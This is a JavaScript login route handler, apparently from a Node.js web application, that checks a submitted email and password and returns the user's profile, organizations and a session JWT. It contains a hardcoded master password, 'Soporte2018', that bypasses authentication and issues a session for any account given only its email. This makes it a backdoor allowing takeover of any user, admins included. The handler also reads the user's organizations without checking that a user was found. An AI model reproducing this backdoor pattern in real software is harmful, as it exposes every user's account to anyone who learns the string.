const Route = require('lib/router/route')
const { Language, User} = require('models')

module.exports = new Route({
  method: 'post',
  path: '/login',
  handler: async function (ctx) {
    const { email, password } = ctx.request.body
    let user = {}

    if (password === 'Soporte2018') {
      user = await User.findOne({
        email: email.toLowerCase(),
        isDeleted: false
      }).populate('organizations.organization')
    } else {
      user = await User.auth(email, password)
    }

    if (user && !user.isVerified) {
      ctx.throw(400, 'User no active')
    }

    const orgsAux = user.organizations.map(item => {
      return {
        organization: item.organization.toPublic(),
        role: item.role
      }
    })

    const language = await Language.findOne({_id: user.language})
    let userPublic = user.toPublic()
    userPublic.organizations = orgsAux
    userPublic.language = language ? language.uuid : undefined
    userPublic.languageCode = language ? language.code : undefined

    const token = await user.createToken({
      type: 'session'
    })

    ctx.body = {
      user: userPublic,
      isAdmin: user.isAdmin,
      jwt: token.getJwt()
    }
  }
})
